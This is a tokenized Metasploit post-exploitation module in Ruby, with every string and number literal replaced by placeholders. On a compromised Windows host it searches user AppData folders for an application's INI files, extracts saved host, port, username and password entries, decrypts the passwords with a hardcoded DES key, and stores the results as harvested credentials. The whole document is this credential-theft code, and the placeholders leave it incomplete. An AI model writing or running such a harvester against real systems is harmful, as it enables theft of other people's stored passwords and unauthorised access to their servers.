require <str> require <str> require <str> require <str> class Metasploit3 < Msf :: Post include Msf :: Post :: Windows :: Registry include Msf :: Auxiliary :: Report include Msf :: Post :: Windows :: UserProfiles def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ <str> ] , <str> = > [ <str> ] ) ) end def run print_status ( <str> ) grab_user_profiles ( ) . each do | user | next if user [ <str> ] == nil check_appdata ( user [ <str> ] + <str> ) check_appdata ( user [ <str> ] + <str> ) end end def check_appdata ( path ) begin client . fs . file . stat ( path ) print_status ( <str> path <str> ) get_ini ( path ) rescue print_status ( <str> path <str> ) end end def get_ini ( filename ) config = client . fs . file . new ( filename , <str> ) parse = config . read ini = Rex :: Parser :: Ini . from_s ( parse ) ini . each_key do | group | next if group == <str> print_status ( <str> group <str> ) host = ini [ group ] [ <str> ] host = host . delete <str> username = ini [ group ] [ <str> ] username = username . delete <str> port = ini [ group ] [ <str> ] passwd = ini [ group ] [ <str> ] passwd = decrypt ( passwd ) next if passwd == nil or passwd == <str> port = <int> if port == nil print_good ( <str> host <str> port <str> username <str> passwd <str> ) service_data = { <str> : Rex :: Socket . getaddress ( host ) , <str> : port , <str> : <str> , <str> : <str> , <str> : myworkspace_id } credential_data = { <str> : <str> , <str> : session_db_id , <str> : self . refname , <str> : username , <str> : passwd , <str> : <str> } credential_core = create_credential ( credential_data . merge ( service_data ) ) login_data = { <str> : credential_core , <str> : <str> , <str> : Metasploit :: Model :: Login :: Status :: UNTRIED } create_credential_login ( login_data . merge ( service_data ) ) end end def decrypt ( pwd ) decoded = pwd . unpack ( <str> ) [ <int> ] key = <str> iv = <str> des = OpenSSL :: Cipher :: Cipher . new ( <str> ) des . decrypt des . key = key des . iv = iv result = des . update ( decoded ) final = result . split ( <str> ) [ <int> ] return final end end 
